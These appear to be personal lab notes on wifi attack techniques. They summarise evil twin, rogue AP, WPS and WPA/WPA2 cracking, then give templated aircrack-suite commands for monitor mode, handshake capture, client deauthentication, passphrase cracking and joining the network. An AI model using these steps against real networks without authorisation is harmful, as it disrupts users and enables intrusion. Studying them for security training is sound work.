Basic wifi attack techniques:
  Evil twin: Start access point with similar name to target access point, then spam
  de-authentication packets towards all users connected to the target AP. Given enough
  frustration, users may try to authenticate to your access point instead.

  Rogue AP: Similar to evil twin, but without actively de-authenticating users.

  WPS attack: Initiates the WPS handshake, but captures the router's response to
  brute-force the PIN and Pre-Shared Key (PSK)

  WPA/WPA2 cracking: Either waits on a client to connect to sniff the 4-way handshake
  or de-authenticates a connected client to force the handshake to reoccur. After
  sniffing the handshake, the PSK can be cracked with standard cracking techniques.

Monitor mode: 
  Listens to all traffic on a channel, whether intended for the device or not (promiscuous mode?)

  Check if monitor mode is available:
    sudo ip link set dev [INTERFACE] down
    sudo iw dev [INTERFACE] set type monitor
    sudo ip link set dev [INTERFACE] up

  Run airodump:
    sudo airodump-ng [INTERFACE]
    sudo airodump-ng -c [DS PARAMETER CHANNEL] --bssid [BSSID] -w [OUTFILE] [INTERFACE]

  Deauthentication attack:
    sudo aireplay-ng -0 [# OF DEAUTH PACKETS] -a [ACCESS PT BSSID] -c [CLIENT BSSID] [INTERFACE]

  Cracking the passphrase:
    sudo aircrack-ng -a [ATTACK MODE] -b [ACCESS PT BSSID] -w [WORDLIST] output*cap

  Joining the network:
    wpa_passphrase MalwareM_AP '[PSK]' > [CONFIGFILE]
    sudo wpa_supplicant -B -c [CONFIGFILE] -i wlan2
